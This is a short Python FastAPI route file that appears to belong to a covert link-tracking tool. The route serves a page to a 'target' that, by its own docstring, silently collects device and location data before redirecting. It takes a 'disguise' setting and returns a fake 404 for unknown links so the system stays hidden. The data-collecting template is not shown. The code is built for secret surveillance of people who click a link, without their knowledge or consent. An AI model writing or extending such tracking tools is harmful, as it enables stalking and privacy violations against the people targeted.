from fastapi import APIRouter, Request
from fastapi.responses import HTMLResponse
from fastapi.templating import Jinja2Templates
from services.link_service import get_link_by_slug

router = APIRouter()
templates = Jinja2Templates(directory="templates")


@router.get("/t/{slug}", response_class=HTMLResponse)
async def tracking_page(slug: str, request: Request):
    """
    The page that the target opens.
    Silently collects device/location data, then redirects.
    """
    link = get_link_by_slug(slug)
    if not link:
        # Return a plain 404 — don't reveal the system exists
        return HTMLResponse(
            "<html><body><h2>404 Not Found</h2></body></html>",
            status_code=404,
        )

    return templates.TemplateResponse(
        request=request,
        name="tracking_page.html",
        context={
            "slug":        slug,
            "ingest_url":  "/api/ingest",
            "redirect_to": link.get("redirect_url", "https://www.google.com"),
            "disguise":    link.get("disguise", "default"),
        },
    )
